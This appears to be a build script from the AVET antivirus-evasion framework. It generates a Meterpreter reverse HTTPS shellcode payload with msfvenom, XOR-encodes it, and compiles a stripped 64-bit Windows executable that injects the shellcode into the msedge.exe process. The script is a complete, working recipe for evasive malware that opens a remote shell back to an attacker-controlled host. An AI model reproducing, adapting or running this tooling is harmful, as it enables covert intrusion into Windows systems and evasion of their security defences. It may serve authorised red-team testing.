#!/bin/bash


#DESCRIPTION_START
# Shellcode injection 64-bit example build script
# Creates an executable that injects the payload into a target process
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug print
enable_debug_print
#CONFIGURATION_END


# generate metasploit payload that will later be injected into the target process
msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c -a x64 --platform Windows > input/sc_c.txt
# -> our custom encryption uses takes a C array and output a xor encryption already formatted to be used in C 

# add evasion techniques
# add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
# add_evasion gethostbyname_sandbox_evasion 'this.that'
reset_evasion_technique_counter

# encode msfvenom shellcode
# encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
encode_custom_enc_payload input/sc_c.txt input/scenc_c.txt
# -> we chose our custom xor encoder, this will output a xor encryption already formatted to be used in C 


# array name buf is expected by static_from_file retrieval method
# ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
# -> we don't need this anymore since our payload is already in the right format

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
# ./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
# set_key_source static_from_file input/key_c.txt
# -> we hardcoded the script in our decoder so we don't need it
set_key_source no_data

# set payload info source
set_payload_info_source static_from_here 'msedge.exe'

# set decoder
set_decoder none

# we set for the decoder our own xor_custom decoder

# set shellcode binding technique
set_payload_execution_method inject_shellcode_procname_dyn_lib

# compile 
$win64_compiler -o output/injectshc_dynamic_lib_APIs_revhttps_stageless_win64.exe source/avet.c -lws2_32
strip output/injectshc_dynamic_lib_APIs_revhttps_stageless_win64.exe

# cleanup
cleanup_techniques


echo "
# Usage example of generated injectshc_dynamic_lib_APIs_revhttps_stageless_win64.exe:
# $ injectshc_dynamic_lib_APIs_revhttps_stageless_win64.exe
"
